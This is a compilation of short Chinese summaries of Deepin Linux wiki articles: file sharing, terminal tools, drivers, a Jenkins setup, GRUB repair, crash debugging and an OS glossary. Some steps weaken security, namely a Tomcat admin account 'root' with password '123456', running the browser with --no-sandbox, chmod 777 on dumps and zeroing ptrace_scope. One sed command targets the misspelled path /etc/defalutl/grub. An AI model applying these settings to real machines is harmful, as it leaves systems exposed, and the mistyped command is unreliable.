SFTP服务端共享目录设置：sudo mkdir -p /data/sftp/mysftp创建目录，sudo usermod -d /data/sftp/mysftp mysftp修改用户目录。

SFTP服务端配置文件修改：注释Subsystem sftp /usr/libexec/openssh/sftp-server，添加Subsystem sftp internal-sftp等内容。

SFTP服务端目录授权：sudo chown root:sftp /data/sftp/mysftp，sudo chmod 755 /data/sftp/mysftp，创建upload目录并授权。

SFTP服务端重启服务用sudo systemctl restart sshd.service，若服务不存在先启用ssh.service。

SFTP客户端访问：进入文件管理器，输入sftp: 服务器IP，输入账号密码即可。

NFS服务端安装工具用sudo apt-get install nfs-kernel-server，创建共享文件夹并设置权限。

NFS服务端修改配置文件/etc/exports，配置项包括共享路径、IP限制和权限等，如/home/deepin-server/nfs 10.20.*(rw)。

NFS服务端启动服务用systemctl start rpcbind nfs-server，查看状态确认服务在running态。

NFS客户端安装用sudo apt-get install nfs-common，查看服务端共享信息用showmount -e 服务器IP。

NFS客户端创建挂载目录，用sudo mount -t nfs 服务端IP:共享路径 本地目录进行挂载，可配置开机自动挂载。

标题：deepin开启wayland切换通道
进入终端下载配置策略工具，命令：apt download dde-dconfig-editor

执行命令解压工具deb包：dpkg -x dde-dconfig-editor_0.0.5.1-1_amd64.deb [解压目录]

示例：dpkg -x dde-dconfig-editor_0.0.5.1-1_amd64.deb /home/qqq/Desktop/

通过终端进入配置策略工具配置页面

在greeter配置中开启wayland切换配置项

注销后通过登录页面右下角按钮切换wayland

标题：开源免费的终端工具WindTerm的使用介绍
WindTerm是完全开源的终端工具，在GitHub上收获6.6k的star，地址为https://github.com/kingToolbox/WindTerm。

WindTerm跨平台，支持Windows、Linux和macOS，可到release页面选择适合的安装包，地址为https://github.com/kingToolbox/WindTerm/releases。

WindTerm界面像IDE布局，左边是资源管理器+文件管理器，中间默认打开zsh终端窗口，右边是会话窗口+历史命令窗口，底部是发送窗口+Shell窗口。

使用WindTerm进行SSH连接，点击新建会话按钮，添加主机名，点击“连接”，输入用户名和密码即可。按住「command+」可放大字体，有折叠功能和智能提示。

WindTerm的SFTP功能与SSH集成，可通过文件管理器上传或拖拽文件，上传有进度条。需安装lrzsz才能在SSH窗口上传，还提供高速传输模式。

WindTerm自动补全功能强大，行首键入!可调出历史命令，支持Linux Shell、MacOS Shell、Windows Cmd、PowerShell及Git等命令行程序的命令。

重置WindTerm锁屏密码：找到user.config文件，删除application.fingerprint和application.masterPassword，删除.wind/profiles/default.v10/terminal/user.sessions文件中的session.autoLogin，再修改主密码。

WindTerm支持亮白模式、暗黑模式、黑白相间模式三种主题切换。

WindTerm的自动复制功能：在设置的文本一栏勾选“自动复制选定内容”，选中内容即可直接复制。

WindTerm有分屏、转接端口等功能，在Windows下的体验比macOS更酷，使用技巧可参考https://kingtoolbox.github.io/。

标题：待机与休眠的区别
睡眠状态中，CPU停止执行指令，内存中的内容保留。

睡眠时未存盘文档在内存中，程序暂停，可通过敲键盘唤醒，断电则内存信息丢失。

系统从睡眠唤醒后，状态恢复如前，应用窗口和内容不变，可继续编辑未存盘文档。

休眠状态下，内存信息写入硬盘，系统零耗电，唤醒时硬盘信息装入内存恢复运行。

休眠与睡眠大部分特征相同，区别在于内存信息处理、耗电及唤醒时的操作。

标题：快速入门导航
Deepin Wiki 提供与 Deepin 有关的常用信息，帮助用户熟悉 Deepin。

认识 Deepin 可参考《Deepin 简介》和《你好，deepin》。

Deepin 稳定版为 20.8，不稳定版为 V23 Alpha，不稳定版需在非生产环境试用，且 V23 安装时格式化/home 没提示用户。

Deepin 版本规划可查看 https://www.deepin.org/zh/developer-community/planning/。

安装 Deepin 可参考适配机型清单、兼容笔记本型号、系统安装教程和双系统安装及手动分区方法。

使用和配置 Deepin 可参考《我的 deepin 变形记》《我个人的 linux 学习笔记分享》《linux 使用的常见问题和经验总结》。

V23 Alpha 因软件兼容性较差，没有内置应用商店。

社区资源推荐包括 Wine 运行器和星火应用商店，星火应用商店官网为 https://www.spark-app.store。

deepin 常用资源整理可在语雀或 Wiki 上查看。

标题：指纹适配信息
社区版内测中推送了首款指纹适配驱动，不符合指定ID的设备暂无法使用。

汇顶科技27c6:5110适配MagicBook 14SE（NIR-WAP9HNRP）、matebook13，状态为已适配。

汇顶科技27C6:659A适配联想Thinkbook 14，状态为已适配。

汇顶科技27c6:5117适配华为matebook13锐龙版（2019），状态为未适配。

汇顶科技27c6:581a适配小米pro15增强版、redmibook 15 pro锐龙版，状态为未适配。

敦泰电子2808:0979适配联想Thinkpad x250，状态为已适配。

fprint支持设备列表详见https://fprint.freedesktop.org/supported-devices.html。

通过lsusb查询指纹设备ID，终端执行sudo lsusb -v |grep "Bus.*27c6:5110"命令匹配。

安装指纹驱动先加内测源：打开控制中心》更新》更新设置》打开内测通道。

安装指纹驱动第二步：sudo apt install goodix-fingerprint-drivers goodix-fingerprint。

安装指纹驱动后需重启，进入控制中心生物认证模块找指纹入口录入。

标题：控制中心卡死问题解决
控制中心卡死可尝试重装deepin控制中心，包名是dde-control-center，命令为sudo apt install dde-control-center。

标题：服务端部署jenkins
安装tomcat及相关组件：apt-get install tomcat9 tomcat9-docs tomcat9-examples tomcat9-admin -y；启动tomcat9：service tomcat9 start。

配置管理员权限需编辑/var/lib/tomcat9/conf/tomcat-users.xml，添加<role rolename="manager-gui"/><role rolename="admin-gui"/><user username="root" password="123456" roles="manager-gui,admin-gui"/>。

配置管理员权限后需重启服务：service tomcat9 restart。

下载jenkins官方软件仓库密钥：wget -q -O - https://pkg.jenkins.io/debian-stable/jenkins.io.key。

添加jenkins密钥到本地：apt-key add jenkins.io.key。

jenkins的源为：deb https://pkg.jenkins.io/debian-stable binary/。

更新并安装jenkins：apt-get update；apt-get install jenkins。

启动jenkins：/etc/init.d/jenkins start。

修改jenkins端口需编辑/etc/default/jenkins，设置HTTP_PORT=8085，再重启：sudo /etc/init.d/jenkins restart。

jenkins首次进入密码位置：/var/lib/jenkins/secrets/initialAdminPassword，之后点击“Install suggested plugins”。

标题：求助问题归集
sudo命令反应缓慢，可在/etc/hosts中添加127.0.0.1与本机计算机名称。

标题：浏览器闪退
查看浏览器版本，确认是否有候选版本：apt policy uos-browser-stable

如果已经是最新版本，可删除~/.config/uosbrowser/Default目录再尝试

输入命令uos-browser --no-sandbox可解决浏览器闪退问题

标题：深度系统字体导致wps排版问题的解决办法
本经验由深度论坛用户(moli3)分享，原文有对应地址。

公司同事排版好的文档，本来只有一页发到我这就变成两页了。

深度优化了字体配置，用另外的字体替换了发虚的宋体等字体，导致文档排版变长，重新安装宋体后版式一致但清晰度下降。

其他字体比宋体高度高，要达到同样排版效果需高度一致，可找等高字体替换或修改宋体，一款清晰宋体可解决问题且不影响其他程序。

解决步骤：1. 将字体simsun.ttc解压到$HOME/.fonts；2. 执行fc-cache -fv刷新cache；3. 重新打开wps或QQ生效，字体链接及密码有对应信息。

标题：社区版仓库
普通用户外网仓库地址：deb https://community-packages.deepin.com/deepin apricot main contrib non-free

普通用户内网仓库地址：deb http://pools.uniontech.com/deepin apricot main contrib non-free

开发者用户内网仓库地址：deb http://pools.uniontech.com/deepin apricot main contrib non-free；deb http://pools.uniontech.com/ppa/dde-apricot apricot main contrib non-free

内网仓库用http访问，外网仓库可用https访问，各版本不兼容。

标题：程序员必知的89个操作系统核心概念
操作系统（Operating System，OS）是管理计算机硬件与软件资源的系统软件，是计算机系统的内核与基石，处理管理与配置内存、决定系统资源供需优先次序等事务，提供用户与系统交互界面。

shell是一个程序，可从键盘获取命令并提供给操作系统执行，过去是类Unix系统唯一用户界面，如今除CLI外还有GUI。

GUI (Graphical User Interface)是允许用户通过图形图标和音频指示符与电子设备交互的用户界面。

内核模式（kernel mode）也称超级模式，执行的代码可完整不受限制访问底层硬件，能执行任何CPU指令并引用任何内存地址，保留给操作系统最低级别、最受信任功能，崩溃会停止整个计算机，是开机自动模式。

用户模式（user node）下操作系统运行用户应用程序，应用程序请求操作系统帮助或发生中断、系统调用时转换为内核模式，用户模式下模式位为1，切换时变为0。

计算机架构是描述计算机系统功能、组织和实现的一组规则和方法，主要包括指令集、内存管理、I/O和总线结构。

SATA(Serial ATA)是一种电脑总线，负责主板和大容量存储设备之间的数据传输，主要用于个人电脑。

复用（multiplexing）也称共享，在操作系统中主要指时间和空间的管理，不同程序或用户轮流使用资源。

大型机（mainframes）是一类计算机，以大尺寸、存储量大、处理能力强和高度可靠性著称，被大型组织用于关键任务应用程序的数据处理。

批处理（batch system）操作系统中用户不直接与计算机交互，在脱机设备上准备工作提交给操作员，将类似需求作业一起批处理成组运行。

OS/360是IBM为1964年发布的System/360大型机开发的已停产批处理操作系统。

多处理系统（Computer multitasking）指计算机同时运行多个程序的能力，通过轮流运行程序代码段、保存工作环境实现。

分时系统（Time-sharing）是通过多程序和多任务同时在许多用户之间共享计算资源的系统。

相容分时系统（Compatible Time-Sharing System）是最早的分时操作系统，由美国麻省理工学院计算机中心设计与实作。

云计算（cloud computing）是计算机系统资源按需可用，无需用户直接主动管理，术语常指Internet上供多用户使用的数据中心，大型云功能多分布在多个位置，近用户连接的为边缘服务器。

UNIX操作系统是强大的多用户、多任务操作系统，支持多种处理器架构，属于分时操作系统。

UNIX System V是UNIX操作系统的一个分支。

BSD(Berkeley Software Distribution)是UNIX的衍生系统。

POSIX是IEEE为使软件在各种UNIX操作系统上运行而定义API的一系列互相关联的标准的总称。

MINIX是一个迷你版本的类UNIX操作系统。

DOS (Disk Operating System)是可以使用磁盘存储设备的计算机操作系统。

MS-DOS是微软公司发展的运行在Intel x86个人电脑上的DOS操作系统，是DOS家族中最著名的，Windows 95前是IBM PC及兼容机基本配备，是个人电脑中最普遍使用的DOS操作系统。

MacOS X是苹果公司推出的基于图形用户界面的操作系统，为Macintosh的主操作系统。

Windows NT是微软公司1993年推出的纯32位操作系统核心。

Service Pack(SP)是程序的更新、修复和（或）增强的集合，以独立安装包形式发布，公司在修补程序达一定数量时发布。

数字版权管理（DRM）是工具或技术保护措施（TPM），是一组访问控制技术，用于限制对专有硬件和受版权保护的作品的使用。

x86是一整套指令集体系结构，由Intel最初基于Intel 8086微处理器及其8088变体开发，采用内存分段处理更多内存，32位是默认位数，x86-64位是64位拓展，向后兼容16位及32位x86架构。

FreeBSD是一个类UNIX的操作系统，是FreeBSD项目的发展成果。

X Window System（X11，或简称X）是用于位图显示的窗口系统，在类UNIX操作系统上很常见。

Gnome是完全由自由软件组成的桌面环境，目标操作系统是Linux，大部分BSD系统亦支持。

网络操作系统是用于网络设备（如路由器，交换机或防火墙）的专用操作系统。

分布式网络系统是在独立、网络、通信和物理上独立计算节点的集合上的软件，处理由多个CPU服务的作业，每个节点拥有全局集合操作系统特定软件的一部分。

程序计数器是CPU中的寄存器，用于指示计算机在其程序序列中的位置。

堆栈寄存器是计算机CPU中的寄存器，目的是跟踪调用堆栈。

程序状态字是由操作系统维护的8个字节（或64位）长的数据的集合，跟踪系统的当前状态。

流水线是一组串联连接的数据处理元素，一个元素的输出是下一个元素的输入，元素通常并行或按时间分割执行，元素间常插入缓冲区存储。

超标量CPU架构是指在一颗处理器内核中实行了指令级并发的一类并发运算，能在相同CPU主频下实现更高CPU流量。

系统调用指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务，提供用户程序与操作系统之间的接口，大多数系统交互式操作需求在内核态运行。

多线程是指从软件或者硬件上实现多个线程并发执行的技术，具有多线程能力的计算机因硬件支持能同时执行多个线程，提升整体处理性能。

CPU核心是CPU的大脑，接收指令，执行计算或运算以满足指令，一个CPU可以有多个内核。

图形处理器（Graphics Processing Unit）是专门在个人电脑、工作站、游戏机和一些移动设备上运行绘图运算工作的微处理器。

存储体系结构中顶层存储器速度最高、容量最小、成本高，层级越向下，访问效率越慢、容量越大、造价越便宜。

高速缓存行是把高速缓存分割成的固定大小的块，大小以突发读或者突发写周期的大小为基础。

缓存命中是当应用程序或软件请求数据时，CPU首先在最近的内存位置（通常是主缓存）中查找数据，若找到则视为缓存命中。

L1 cache是CPU芯片中内置的存储库，也称为主缓存，是计算机中最快的内存，最接近处理器。

L2 cache是内置在CPU芯片中、包装在同一模块中或建在主板上的存储库，为L1缓存提供数据，比L1内存慢。

L3 cache是内置在主板上或CPU模块内的存储库，为L2缓存提供数据，内存比L2慢但比主内存快，依次提供给L2、L1缓存再到处理器。

RAM（Random Access Memory）是与CPU直接交换数据的内部存储器，可随时读写，速度快，作为操作系统或运行中程序的临时数据存储介质，断电数据丢失。

ROM (Read Only Memory)是半导体存储器，一旦存储数据无法改变或删除，内容不因电源关闭而消失，用于存储不需经常变更的程序或数据。

EEPROM (Electrically Erasable PROM)是可通过电子方式多次复写的半导体存储设备。

闪存是电子式可清除程序化只读存储器的形式，允许在操作中被多次擦或写，用于一般性数据存储及电脑与数字产品间数据交换。

SSD(Solid State Disks)是主要以闪存作为永久性存储器的电脑存储设备。

虚拟地址是计算机系统内存管理机制，使应用程序认为有连续可用内存，实际被分隔成多个物理内存碎片，部分暂存外部磁盘，需时交换数据，方便编写大型程序，有效使用物理内存。

MMU (Memory Management Unit)是处理CPU内存访问请求的计算机硬件，功能包括虚拟地址到物理地址的转换、内存保护、CPU高速缓存控制等。

context switch（上下文切换）是存储和重建CPU状态的机制，交换CPU上的进程时需先存储当前进程状态，再将进程状态读回CPU。

驱动程序（device driver）是允许高级别电脑软件与硬件交互的程序，创建硬件与硬件或硬件与软件沟通的接口，使硬件设备数据交换成为可能。

忙等（busy waiting）也称自旋，是进程反复检查一个条件是否为真的机制，如检查键盘输入或某个锁是否可用。

中断（Interrupt）是处理器接收到外围硬件异步信号或软件同步信号后进行相应处理，硬件中断导致处理器保存执行状态，软件中断是CPU指令集中的指令指示运行信息切换并导向中断处理代码，在多任务处理尤其是即时系统中有用。

中断向量位于中断向量表中，中断向量表（IVT）是将中断处理程序列表与中断请求列表相关联的数据结构，每个条目是中断处理程序的地址。

DMA (Direct Memory Access)是计算机科学中的内存访问技术，允许某些电脑内部硬件子系统独立直接读写系统内存，不需CPU介入处理。

总线（Bus）是计算机组件间规范化的交换数据的方式，以通用方式为各组件提供数据传送和控制逻辑。

PCIe (Peripheral Component Interconnect Express)是计算机总线的重要分支，沿用PCI编程概念及信号标准，构建更高速的串行通信系统标准。

DMI (Direct Media Interface)是英特尔专用的总线，用于电脑主板上南桥芯片和北桥芯片之间的连接。

USB(Universal Serial Bus)是连接计算机系统与外部设备的串口总线标准，也是输入输出接口技术规范，应用于个人电脑、移动设备等，扩展至摄影器材等领域。

BIOS(Basic Input Output System)是通电引导阶段运行硬件初始化及为操作系统提供运行时服务的固件，是开机时运行的第一个软件。

硬实时系统（hard real-time system）要求必须绝对在每个截止日期前完成任务，如核系统、一些医疗应用、国防应用、航空电子设备等。

软实时系统（soft real-time system）可能会错过某些截止日期，错过太多会导致性能下降，如计算机中的声音系统。

进程（Process）是程序（指令和数据）的真正运行实例，可能与同一个程序相关，每个进程可同步或异步独立运行。

地址空间是内存中可供程序或进程使用的有效地址范围，即程序或进程可访问的内存，可为物理或虚拟内存，用于执行指令和存储数据。

进程表是操作系统维护的数据结构，每个条目（上下文块）包含进程信息，如名称、状态、优先级、寄存器、等待的信号灯等。

命令行界面（command-line interpreter）是图形用户界面普及前广泛使用的用户界面，不支持鼠标，用户通过键盘输入指令，计算机执行。

进程间通信（interprocess communication）是至少两个进程或线程间传送数据或信号的技术或方法。

超级用户（superuser）也称管理员帐户，是用于系统管理的特殊用户，实际名称因系统而异，如root、administrator与supervisor。

目录（directory）是装有数字文件系统的虚拟容器，里面保存一组文件和其它目录。

路径（path name）是电脑文件或目录名称的通用表现形式，指向文件系统上的唯一位置。

根目录（root directory）是计算机系统中的顶层目录，如Windows中的C盘和D盘，Linux中的“/”。

工作目录（Working directory）是用户在操作系统内所在的目录，用户可在此用相对文件名访问文件。

文件描述符（file descriptor）是表述指向文件的引用的抽象化概念。

inode是UNIX系统中包含每个文件详细信息的索引节点，如节点、所有者、文件、文件位置等。

共享库（shared library）是包含目标代码的文件，执行过程中多个a.out文件可能同时使用该目标代码。

DLLs (Dynamic-Link Libraries)是微软公司在操作系统中实现共享函数库概念的方式，库函数扩展名是.DLL、.OCX或.DRV。

客户端（clients）是访问服务器提供的服务的计算机硬件或软件。

服务端（servers）是为其他程序或设备提供功能的计算机程序或设备。

主从架构（client-server）也称客户端/服务器架构、C/S架构，是区分客户端与服务器的网络架构，客户端实例可向服务器或应用程序服务器发出请求，有多种服务器类型。

虚拟机（Virtual Machines）是特殊软件，在计算机平台和终端用户间创建环境，终端用户基于此环境操作其它软件。

Java虚拟机（Jaav virtual Machines）有完善的硬体架构，如处理器、堆栈、寄存器等，有相应指令系统，屏蔽与具体操作系统平台相关信息，使Java程序生成字节码可在多平台运行。

目标文件（object file）是包含目标代码的文件，是通常无法直接执行的可重定位格式的机器代码，有多种格式，可像共享库一样工作。

C preprocessor是C语言、C++语言的预处理器，用于编译器处理程序前预扫描源代码，完成头文件包含、宏扩展、条件编译、行控制等操作。

标题：窗口显示常见问题
应用图标异常可能是系统主题图标缺失或qt5ct包导致，可安装qtxdg-dev-tools-tools，用qtxdg-iconfinder"computer"排查，dde-qt5integration、dde-qt5xcb-plugin也可能影响。

标题栏右键菜单背景色与应用窗口颜色不一致，因菜单颜色跟随系统，应用主题未设置跟随系统或不一致导致，可设置应用主题跟随系统或与系统主题颜色一致。

标题栏拖动鼠标无法拖动窗口，因DTitlebar修改了mousePressEvent等三个函数，拖动依赖其处理，解决方法是DTitlebar内控件重写这三个函数时需调用父类对应函数。

标题：简单几步为Deepin添加蓝牙音频编码支持
UOS的蓝牙音频（A2DP）默认只支持SBC音频编码，音质一般。很多蓝牙耳机支持LDAC、aptX HD、aptX、AAC等高音质编码，可自行添加。

方案来自开源项目，原文适用于Ubuntu，改为适用于UOS 20，可能适用于Deepin v20（未测试）。

安装步骤1：仅UOS需要，Deepin不需要，打开开发者模式（“控制中心 > 通用 > 开发者模式”）。

安装步骤2：打开终端，输入命令添加蓝牙音频编码器软件源：echo 'deb http://ppa.launchpad.net/eh5/pulseaudio-a2dp/ubuntu bionic main' | sudo tee /etc/apt/sources.list.d/pulseaudio-a2dp.list，提示输入开机密码。

后续步骤：信任软件源（sudo apt-key adv --keyserver keyserver.ubuntu.com --recv A45582EC25E9D8E6）、更新软件列表（sudo apt update）、升级蓝牙音频组件（sudo apt upgrade -y）、安装支持多种编码的组件（sudo apt install -y pulseaudio libavcodec58 libldac pulseaudio-modules-bt pavucontrol）。

ppa.launchpad.net服务器在国外，可能导致下载慢或报错，需自行解决。

标题：系统升级后如何回退
全盘安装时，系统会自动生成AB镜像，即相互备份的两个根分区，具备回滚功能。勾选“创建初始化备份”则有恢复出厂设置功能。

全盘安装时，使用终端进行系统更新不会有回滚功能，终端不触发备份；仅控制中心更新才有回滚功能，建议日常用控制中心更新。

手动分区安装时，没有AB镜像，系统不触发备份功能，无法使用自带备份功能。

手动分区安装时，可借助第三方工具实现系统备份还原，推荐timeshift工具，参考帖子：[点我直达](https://bbs.deepin.org/post/203799)。

可通过查看更新日志文件了解更新详情，命令为tail -n 30 /var/log/apt/history.log，30可调整，能查看上一次所有更新信息。

从更新日志可看到更新时间、具体更新的包名及更新前后的版本号，据此可重装降级回退，如sudo apt reinstall dde-file-manager=5.6.3-1。

若有不想被升级的应用，可手动锁定，如sudo apt-mark hold dde-file-manager；想升级时解锁，命令为sudo apt-mark unhold dde-file-manager。

标题：系统安装后无法进入桌面
安装完毕，进入界面为空白界面（仅有壁纸），鼠标右键无法使用，左键无法框选，类似双屏的副屏。

鼠标放当前界面按ctrl+alt+t唤出终端；鼠标移到屏幕左边外点击后按快捷键，当前界面看不到终端。

鼠标移到屏幕左边外点击，按win+e，再按alt+空格，方向键下三次按enter，方向键右按住，文件管理器窗口从左边移出，证明当前屏幕是副屏。

问题因工控主板内置双显卡，默认主屏为内置显卡输出，外置显卡输出为副屏，显示器用外置显卡输出，deepin初始双屏策略为扩展分屏。

windows双显卡初始双屏策略是复制分屏，故无此问题，在win7、win10中已确认。

解决步骤：ctrl+alt+t唤出终端，执行xrandr查看显示输出端口；xrandr --output 当前屏幕 --auto --primary设为主屏；xrandr --output 内置显卡输出端口 --off关掉内置端口。

示例：内置显卡输出端口是eDP-1，当前屏幕端口是DP-1，执行xrandr --output DP-1 --auto --primary和xrandr --output eDP-1 --off。

最后需在控制中心将显示输出设置为“只在当前显示器上显示”，否则下次开机仍会识别为副屏。

标题：自动更换壁纸
自动更换壁纸通过DBus调用com.deepin.daemon.Appearance服务的SetWallpaperSlideShow方法实现。

DBus服务名：com.deepin.daemon.Appearance；地址：/com/deepin/daemon/Appearance；接口：com.deepin.daemon.Appearance。

SetWallpaperSlideShow方法参数：monitorName为显示器名字，如“HDMI-0”；wallpaperSlideShow为更换时间，取值有""（关闭）、"30"（30秒）等。

显示器名称可从com.deepin.daemon.Display服务列表中/com/deepin/daemon/Display/Monitor_×的com.deepin.daemon.Display.Monitor接口中的"Name"属性获取。

Qt代码中，通过QDBusInterface调用SetWallpaperSlideShow方法，传入monitorName和wallpaperSlideShow参数实现设置。

命令：为HDMI-0设置每30秒换壁纸：qdbus com.deepin.daemon.Appearance /com/deepin/daemon/Appearance com.deepin.daemon.Appearance.SetWallpaperSlideShow "HDMI-0" "30"。

命令：关闭HDMI-0自动换壁纸：qdbus com.deepin.daemon.Appearance /com/deepin/daemon/Appearance com.deepin.daemon.Appearance.SetWallpaperSlideShow "HDMI-0" ""。

wallpaperSlideShow取值包括"60"（1分钟）、"300"（5分钟）、"600"（10分钟）、"900"（15分钟）等。

wallpaperSlideShow取值还有"1800"（30分钟）、"3600"（1小时）、"login"（登录时）、"wakeup"（唤醒时）。

标题：自研应用实用功能点分享
快速启动截图/录屏的快捷键：Ctrl+Alt+A / Ctrl+Alt+R

向上扩大选区高度的快捷键：Ctrl+Up

向下扩大选区高度的快捷键：Ctrl+Down

向左扩大选区高度的快捷键：Ctrl+Left

向右扩大选区高度的快捷键：Ctrl+Right

延时五秒截屏的快捷键：Alt+PrintScreen

快速启动剪切板的快捷键：Ctrl+Alt+V

调整剪切板历史文件到最新复制的方法：打开剪切板，找到前面复制的历史纪录，双击该历史复制纪录，该纪录就会置顶成为最新的纪录。

标题：获取文件管理器日志
文件管理器server的日志路径为~/.cache/deepin/dde-file-manager-server

文件管理器的日志路径是~/.cache/deepin/dde-file-manager/dde-file-manager.log

文件管理器卡住但进程未崩溃时，可参考wiki《调试卡住程序方法》获取core文件

文件管理器崩溃时，需安装systemd-coredump工具获取coredump日志，路径为/var/lib/systemd/coredump

拷贝coredump日志到桌面的命令为sudo cp + xxx.zst /home/用户名/Desktop，之后需用sudo chmod 777 + xxx.zst修改权限

解压coredump日志需先安装zstd包，命令为sudo apt install zstd，再用zstd -d + xxx.zst解压

本地查看解压至桌面的coredump日志需安装gdb包，命令为sudo apt install gdb

用gdb查看解压后的coredump日志文件的命令为gdb dde-file-manager ./+解压后的coredump日志文件

查看崩溃日志对应进程pid的命令是coredumpctl list -r

将coredump日志输出为文本文件的命令为coredumpctl gdb + pid | tee ./log，在gdb调试时输入bt获取流程日志，输入q退出保存

标题：解决MindMaster在4k分辨率下菜单栏错位问题
MindMaster在4k分辨率、全局200%缩放时菜单栏字体错位严重，1080p或4k不缩放时正常，4k不缩放且启动界面添加qt应用缩放2倍也正常。

解决MindMaster菜单栏错位问题需添加QT自动缩放参数export QT_AUTO_SCREEN_SCALE_FACTOR=1。

编辑MindMaster启动脚本的步骤：sudo vim /opt/MindMaster-10/mindmaster.sh，在倒数第二行添加export QT_AUTO_SCREEN_SCALE_FACTOR=1，保存即可。

添加参数后启动脚本内容：export LD_LIBRARY_PATH='/opt/MindMaster-10/lib/'，export QT_AUTO_SCREEN_SCALE_FACTOR=1，/opt/MindMaster-10/MindMaster "$@"。

标题：调试卡住程序方法
调试卡住程序方法针对进程卡住但未退出的情况。

程序卡死具有偶然性，现场难保留，复现方式不固定，日志难分析原因。

gcore工具可获取运行中进程的内存地址、寄存器、堆栈信息即core文件。

core文件按ELF格式组成，只有执行视图，有Program Headers，无Section Heders。

Linux不保存core文件中代码段（RX属性）内容，只保存地址信息；线程、寄存器等辅助信息在PT_NOTE类型Segment段中。

下载gdb用命令：sudo apt install gdb；获取core文件用：gcore pid(进程号)。

输入gcore + pid提示报错，可切换root用户，若鉴定故障，修改root密码：sudo passwd root，再输入echo 0 > /proc/sys/kernel/yama/ptrace_scope。

标题：Grub启动项配置
grub是一个引导管理程序，全称GRand Unified Bootloader，可在多个操作系统共存时选择引导哪个系统，能引导Linux、Windows等多种系统。

grub支持大硬盘、定制开机画面、菜单式选择等特点，其命令行功能强大，支持历史功能，通过/boot/grub/grub.cfg加载内核启动系统。

制作grub启动盘需先确定grub已安装，进入/boot/grub目录，用dd命令将stage1和stage2写入软盘，也可用mkbootdisk命令，需指定内核版本号。

GRUB启动时载入/boot/grub/grub.cfg，修改/etc/default/grub或/etc/grub.d/文件后需重新生成主配置文件，指令为update-grub或grub-mkconfig。

/etc/grub.d里的脚本有00_header、05_debian_theme等，数字决定执行顺序，如想将windows启动项放第一个，可改35_os-prober前数字为5到10之间。

更改grub字体可用grub-mkfont工具，从ttc字体制作pf2字体，放入$prefix/fonts目录，修改grub.cfg中gfxterm_font和loadfont相关行，推荐等宽中文字体。

替换grub背景图需替换/boot/grub/themes/deepin/background.jpg，重新生成cfg配置文件，否则重启后失效。

去除grub默认选项框需修改/boot/grub/themes/deepin/theme.txt，注释menu_pixmap_style = "menu_*.png"，重新生成cfg配置文件。

修改grub等待时间可直接改/boot/grub/grub.cfg中set timeout的值，或在/etc/default/grub文件内放入GRUB_TIMEOUT=xxxx。

修改grub启动项菜单名称可改grub.cfg文件里顶格写的menuentry字段后单引号内容，修改完需更新cfg文件。

标题：修复GRUB启动错误
GRUB安装分为三部分：第一部分一般在MBR上，第二部分是core.img嵌入MBR后的保留扇区，第三部分在/boot/grub或对应分区的/grub目录（针对GRUB2.0）。

一般GRUB菜单直接显示。用户若将等待时间设为0，开机时按住Shift键可临时显示，部分主板需多重启；也可进入深度操作系统的控制中心->启动菜单调整。

deepin15.3（UEFI）启动失败时，报错为grub>，因normal.mod出错，可能是easybcd与grub兼容问题或未清理efi分区等导致。

解决deepin15.3（UEFI）启动失败：进入grub命令行输入set，查看prefix=行；加载内核输入linux (hd2,gpt1)/boot/vmlinuz补全后加root=/dev/sda1等；输入initrd补全；boot进入系统后sudo update-grub并在控制中心更新启动菜单。

旧版GRUB错误为error:unknow filesystem，grub rescue>，可能因删除/格式化Linux分区、调整磁盘分区、重装系统未装GRUB2、恢复老版本系统破坏GRUB2导致。

重装GRUB步骤：用深度启动盘引导，Ctrl+Alt+F1进入Live CD；挂载系统分区到/mnt，必要时挂载/boot和/dev等；chroot后，BIOS引导用grub-install /dev/sda等，UEFI引导需挂载EFI分区、重装grub-efi等。

EFI+GPT模式修复双系统引导：用Linux启动盘进入Live系统，创建文件夹并挂载Linux的/分区和EFI分区；用efibootmgr创建启动项，重启进入系统后重装GRUB2并刷新配置。

解决开关机动画不显示：修改/boot/grub/grub.cfg，搜索当前核心，将最后面的ro  quiet改为ro splash quiet，重启即可。

标题：浅探deepin-Live和修复Linux引导
制作启动盘推荐使用Ventoy，也可用Rufus（仅Windows）、Etcher等软件。

Live系统关机后数据不保留，deepin镜像无Persistence功能，使用时关机前勿拔U盘。

deepin V23 Beta安装镜像无法通过修改启动参数进入Live。

UEFI启动进入deepin Live：Install Deepin高亮时按e，删去livecd-installer，改后为locales=zh_CN.UTF-8，按F10。

Legacy启动进入deepin Live：Install Deepin高亮时按Tab，删去livecd-installer，按回车。

修改Live用户密码：终端执行sudo su和passwd，输入新密码。

官方Live系统发布于2018年，内置深度系统修复工具等，不能用于安装。

ExTix Deepin镜像Live默认用户是live，密码live；root用户密码root。

修复deepin引导可用深度系统修复工具，官方Live、Community LiveCD中内置。

手动修复引导：先lsblk -f找系统分区sdaX，挂载后执行grub-install等命令。

标题：11代酷睿花屏的解决方案
小新 Pro-14 2021（Intel平台：IHU版，第十一代智能英特尔酷睿I5-11320H，16GB LPDDR4X 4266MHz，英特尔锐炬 Xe 显卡）安装deepin系统，会产生花屏，运行卡顿，鼠标按键柱偏移等情况。

解决11代酷睿在deepin系统花屏问题，需打开终端，输入命令：sudo sed -i 's/GRUB_CMDLINE_LINUX=""/GRUB_CMDLINE_LINUX="i915.enable_psr=0"/' /etc/defalutl/grub 和 sudo update-grub。

标题：华为AMD笔记本，无显卡驱动解决方法
用户反馈华为AMD笔记本显卡驱动看不到，待机唤醒有问题，显示适配器无内容，设备管理器中无法展示具体显卡信息。

用户安装时选择5.15版本内核，切换回5.10版本内核仍未解决华为AMD笔记本无显卡驱动问题。

解决华为AMD笔记本无显卡驱动问题，需编辑grub启动目录，在GRUB_CMDLINE_LINUX_DEFAULT一行末尾添加amdgpu.exp_hw_support=1，保存退出并更新grub，最后重启。

标题：修复或添加windows启动项
使用U盘安装linux（ubuntu、deepin）后，windows系统启动/引导项丢失，可恢复win7启动/引导项。

修复windows启动项需计算机、windows、linux（ubuntu、deepin）。

修复步骤第一步：终端输入sudo gedit /boot/grub/grub.cfg，回车输密码打开grub.cfg文件。

第二步用特定代码替代### BEGIN /etc/grub.d/40_custom ###和### END /etc/grub.d/40_custom ###之间原有代码。

替代代码为：menuentry "Windows 7" {insmod part_msdos insmod ntfs set root='(hd0,msdos1)' chainloader +1}

set root='(hd0,msdos1)'中的'(hd0,msdos1)'是windows系统所在分区。

该方法适用于添加windows7和window10开机引导项，windows8未测试。

menuentry "Windows 7"{里的Windows 7是开机引导项中的名字，可替换。

注意事项：注意windows系统所在分区，方法仅在ubuntu和deepin下测试过。

